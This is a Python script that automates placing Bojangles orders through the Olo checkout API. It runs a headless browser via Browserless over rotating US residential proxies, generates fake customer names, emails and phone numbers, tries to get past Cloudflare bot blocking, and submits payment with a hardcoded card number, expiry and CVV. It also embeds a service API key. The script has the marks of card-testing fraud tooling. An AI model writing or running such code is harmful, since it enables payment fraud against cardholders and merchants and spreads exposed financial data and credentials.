import requests
import random
import json

# --- Browserless API Configuration ---
BROWSERLESS_API_KEY = "2Tn8NhyDBfg4FSH4f10f994e1dca40357fa39e7d5f7314b23"
BROWSERLESS_BASE_URL = "https://production-sfo.browserless.io"

# --- Pre-defined lists for rotating user data ---
first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
email_domains = ["@gmail.com", "@yahoo.com", "@outlook.com", "@hotmail.com"]

def get_random_phone_number():
    """Generates a random US-formatted phone number."""
    return f"{random.randint(201, 999)}-{random.randint(100, 999)}-{random.randint(1000, 9999)}"

def process_order_with_browserless():
    """
    Process order using Browserless API with built-in USA residential proxy
    """
    try:
        # Generate random user data
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10,99)}{random.choice(email_domains)}"
        phone_number = get_random_phone_number()
        
        print("="*70)
        print("BOJANGLES ORDER AUTOMATION (BROWSERLESS + USA PROXY)")
        print("="*70)
        print(f"[*] Using Browserless API with USA Residential Proxy")
        print(f"\n[*] Using Rotated User Data:")
        print(f"    - Name: {first_name} {last_name}")
        print(f"    - Email: {email}")
        print(f"    - Phone: {phone_number}")
        
        # Step 1: Get access token using Browserless
        order_id = "def67214-7132-4e25-a8ea-7a18923f734f"
        token_url = f'https://www.bojangles.com/api/v1/orders/{order_id}/token'
        
        print(f"\n[*] Fetching access token via Browserless...")
        
        # Use Browserless Function API to execute custom code
        function_code = f"""
export default async ({{ page }}) => {{
    // Navigate to token URL
    const response = await page.goto('{token_url}', {{
        waitUntil: 'networkidle0'
    }});
    
    // Get response text
    const text = await response.text();
    
    // Parse JSON
    const data = JSON.parse(text);
    
    return {{
        success: true,
        accessToken: data.accesstoken || data.accessToken,
        rawResponse: text
    }};
}};
"""
        
        # Call Browserless Function API with USA proxy
        browserless_url = f"{BROWSERLESS_BASE_URL}/function?token={BROWSERLESS_API_KEY}&proxy=residential&proxyCountry=us"
        
        response = requests.post(
            browserless_url,
            headers={'Content-Type': 'application/javascript'},
            data=function_code,
            timeout=60
        )
        
        if response.status_code != 200:
            print(f"[!] Browserless API Error: {response.status_code}")
            print(f"Response: {response.text}")
            return
        
        token_result = response.json()
        
        if not token_result.get('success'):
            print(f"[!] Failed to get access token")
            print(f"Response: {token_result}")
            return
        
        access_token = token_result.get('accessToken')
        print(f"[+] Successfully retrieved Access Token: {access_token}")
        
        # Step 2: Submit order using Browserless
        print(f"\n[*] Submitting order via Browserless...")
        
        submit_url = f'https://www.olocheckout.com/api/baskets/{order_id}/submit'
        
        # Prepare order data
        order_data = {
            'brandAccessId': 'pOsOaQRlbWrRjoMlO82GyeaaXhVRBNwn',
            'accessToken': access_token,
            'firstName': first_name,
            'lastName': last_name,
            'emailAddress': email,
            'contactNumber': phone_number,
            'customData': [],
            'billingAccounts': [{
                'billingFields': [],
                'billingMethod': 'creditcard',
                'expiryYear': '2028',
                'expiryMonth': '10',
                'zip': '10080',
                'saveOnFile': False,
                'amount': 11.49,
                'tipPortion': 0,
                'cardNumber': '4677845104934858',
                'cvv': '548',
            }],
            'bookingUserOptIntoSms': False,
            'createOloAccount': False,
        }
        
        # Create function to submit order
        submit_function = f"""
export default async ({{ page }}) => {{
    // First navigate to olocheckout.com to establish session
    await page.goto('https://www.olocheckout.com', {{
        waitUntil: 'networkidle0'
    }});
    
    // Wait a bit for any Cloudflare challenges
    await new Promise(resolve => setTimeout(resolve, 5000));
    
    // Check if we're blocked
    const pageContent = await page.content();
    if (pageContent.includes('Cloudflare') && pageContent.includes('blocked')) {{
        return {{
            success: false,
            error: 'Blocked by Cloudflare',
            status: 403
        }};
    }}
    
    // Make the POST request using page.evaluate
    const result = await page.evaluate(async (submitUrl, orderData) => {{
        try {{
            const response = await fetch(submitUrl, {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/json',
                    'x-olo-domain-origin': 'https://www.bojangles.com',
                    'x-olo-request': '1'
                }},
                body: JSON.stringify(orderData)
            }});
            
            const text = await response.text();
            
            return {{
                success: true,
                status: response.status,
                body: text
            }};
        }} catch (error) {{
            return {{
                success: false,
                error: error.toString()
            }};
        }}
    }}, '{submit_url}', {json.dumps(order_data)});
    
    return result;
}};
"""
        
        # Call Browserless with submit function
        submit_response = requests.post(
            browserless_url,
            headers={'Content-Type': 'application/javascript'},
            data=submit_function,
            timeout=90
        )
        
        if submit_response.status_code != 200:
            print(f"[!] Browserless API Error: {submit_response.status_code}")
            print(f"Response: {submit_response.text}")
            return
        
        submit_result = submit_response.json()
        
        # Display results
        print("\n" + "="*70)
        print("FINAL RESPONSE")
        print("="*70)
        
        if not submit_result.get('success'):
            print(f"[!] Order submission failed")
            print(f"Error: {submit_result.get('error', 'Unknown error')}")
            if submit_result.get('status') == 403:
                print("\n[-] Still blocked by Cloudflare")
                print("[-] The Browserless residential proxy might be detected")
        else:
            status = submit_result.get('status')
            body = submit_result.get('body', '')
            
            print(f"Status Code: {status}")
            print(f"\nResponse Body:")
            print(body)
            
            if status == 200:
                print("\n[+] SUCCESS! Order submitted successfully!")
            elif status == 403:
                print("\n[-] Blocked by Cloudflare (403 Forbidden)")
            else:
                print(f"\n[!] Unexpected status code: {status}")
        
        print("="*70)
        
    except requests.exceptions.Timeout:
        print("\n[!] Request timed out. Browserless might be taking too long.")
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Network error: {e}")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    process_order_with_browserless()
